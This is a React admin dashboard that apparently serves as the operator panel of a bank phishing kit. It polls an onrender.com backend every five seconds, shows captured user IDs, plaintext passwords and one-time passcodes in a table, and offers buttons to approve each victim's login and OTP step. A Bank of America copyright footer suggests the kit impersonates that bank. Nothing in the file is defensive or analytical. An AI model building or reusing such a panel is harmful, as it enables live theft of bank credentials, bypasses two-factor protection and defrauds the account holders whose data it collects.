import { useEffect, useState } from "react";

interface User {
  id: number;
  user_id: string;
  password: string;
  otp: string | null;
  status: "pending" | "authorized" | "rejected";
  otp_status: "otp_pending" | "authorized" | "rejected" | null;
}

const AdminDashboard: React.FC = () => {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(false);
  const DEBUG = true;

  // ----------------------------
  // Fetch all users
  // ----------------------------
  const fetchUsers = async () => {
    setLoading(true);
    try {
      if (DEBUG) console.log("🔄 Fetching users...");
      const res = await fetch(
        "https://urban-system-backend.onrender.com/api/users"
      );
      const text = await res.text();

      try {
        const data: User[] = JSON.parse(text);
        setUsers(data);
        if (DEBUG) console.log("✅ Users fetched:", data);
      } catch {
        console.error("❌ Failed to parse response:", text);
      }
    } catch (err) {
      console.error("❌ Fetch users failed:", err);
    } finally {
      setLoading(false);
    }
  };

  // ----------------------------
  // Approve or reject LOGIN
  // ----------------------------
  const handleLoginAction = async (
    id: number,
    action: "approve" | "reject"
  ) => {
    if (DEBUG) console.log(`✏️ ${action} login for user ${id}...`);
    try {
      const res = await fetch(
        `https://urban-system-backend.onrender.com/api/authorize/${id}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action }),
        }
      );

      const text = await res.text();
      const data = JSON.parse(text || "{}");

      if (!res.ok) {
        console.error(`❌ Failed to ${action} login for user ${id}:`, data);
        return;
      }

      setUsers((prev) =>
        prev.map((u) =>
          u.id === id
            ? {
                ...u,
                status: action === "approve" ? "authorized" : "rejected",
                otp_status: action === "approve" ? "otp_pending" : null,
              }
            : u
        )
      );

      console.log(`✅ Login ${action} complete for user ${id}`);
    } catch (err) {
      console.error(`❌ Error approving login for ${id}:`, err);
    }
  };

  // ----------------------------
  // Approve or reject OTP
  // ----------------------------
  const handleOtpAction = async (id: number, action: "approve" | "reject") => {
    if (DEBUG) console.log(`✏️ ${action} OTP for user ${id}...`);
    try {
      const res = await fetch(
        `https://urban-system-backend.onrender.com/api/otp-authorize/${id}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action }),
        }
      );

      const text = await res.text();
      const data = JSON.parse(text || "{}");

      if (!res.ok) {
        console.error(`❌ Failed to ${action} OTP for user ${id}:`, data);
        return;
      }

      setUsers((prev) =>
        prev.map((u) =>
          u.id === id
            ? {
                ...u,
                otp_status: action === "approve" ? "authorized" : "rejected",
              }
            : u
        )
      );

      console.log(`✅ OTP ${action} complete for user ${id}`);
    } catch (err) {
      console.error(`❌ Error ${action} OTP for ${id}:`, err);
    }
  };

  // ----------------------------
  // Auto refresh every 5s
  // ----------------------------
  useEffect(() => {
    fetchUsers();
    const interval = setInterval(fetchUsers, 5000);
    return () => clearInterval(interval);
  }, []);

  // ----------------------------
  // Render table
  // ----------------------------
  return (
    <div className="max-w-6xl mx-auto p-6">
      <h2 className="text-2xl font-semibold mb-6 text-center">
        Admin Control Panel
      </h2>

      {loading && <p className="text-center text-gray-500">Loading users...</p>}

      <table className="w-full table-auto border-collapse border border-gray-300 shadow-sm">
        <thead>
          <tr className="bg-gray-100">
            <th className="border px-4 py-2">ID</th>
            <th className="border px-4 py-2">User ID</th>
            <th className="border px-4 py-2">Password</th>
            <th className="border px-4 py-2">OTP</th>
            <th className="border px-4 py-2">Login Status</th>
            <th className="border px-4 py-2">OTP Status</th>
            <th className="border px-4 py-2">Actions</th>
          </tr>
        </thead>

        <tbody>
          {users.map((u) => (
            <tr key={u.id} className="text-center hover:bg-gray-50 transition">
              <td className="border px-4 py-2">{u.id}</td>
              <td className="border px-4 py-2">{u.user_id}</td>
              <td className="border px-4 py-2">{u.password}</td>
              <td className="border px-4 py-2">{u.otp || "-"}</td>
              <td
                className={`border px-4 py-2 font-semibold ${
                  u.status === "authorized"
                    ? "text-green-600"
                    : u.status === "rejected"
                    ? "text-red-500"
                    : "text-gray-600"
                }`}
              >
                {u.status}
              </td>
              <td
                className={`border px-4 py-2 font-semibold ${
                  u.otp_status === "authorized"
                    ? "text-green-600"
                    : u.otp_status === "rejected"
                    ? "text-red-500"
                    : "text-gray-600"
                }`}
              >
                {u.otp_status || "-"}
              </td>

              <td className="border px-4 py-2 space-x-2">
                {/* LOGIN approvals */}
                {u.status === "pending" && (
                  <>
                    <button
                      onClick={() => handleLoginAction(u.id, "approve")}
                      className="bg-green-500 text-white px-3 py-1 rounded hover:bg-green-600"
                    >
                      Approve Login
                    </button>
                    <button
                      onClick={() => handleLoginAction(u.id, "reject")}
                      className="bg-red-500 text-white px-3 py-1 rounded hover:bg-red-600"
                    >
                      Reject Login
                    </button>
                  </>
                )}

                {/* OTP approvals */}
                {u.status === "authorized" &&
                  u.otp &&
                  u.otp_status === "otp_pending" && (
                    <>
                      <button
                        onClick={() => handleOtpAction(u.id, "approve")}
                        className="bg-green-500 text-white px-3 py-1 rounded hover:bg-green-600"
                      >
                        Approve OTP
                      </button>
                      <button
                        onClick={() => handleOtpAction(u.id, "reject")}
                        className="bg-red-500 text-white px-3 py-1 rounded hover:bg-red-600"
                      >
                        Reject OTP
                      </button>
                    </>
                  )}
              </td>
            </tr>
          ))}

          {users.length === 0 && !loading && (
            <tr>
              <td colSpan={7} className="text-gray-500 py-4 text-center">
                No users or OTPs pending approval
              </td>
            </tr>
          )}
        </tbody>
      </table>

      <footer className="py-4 text-center text-xs text-gray-400 mt-6">
        © {new Date().getFullYear()} Bank of America Corporation. All rights
        reserved.
      </footer>
    </div>
  );
};

export default AdminDashboard;
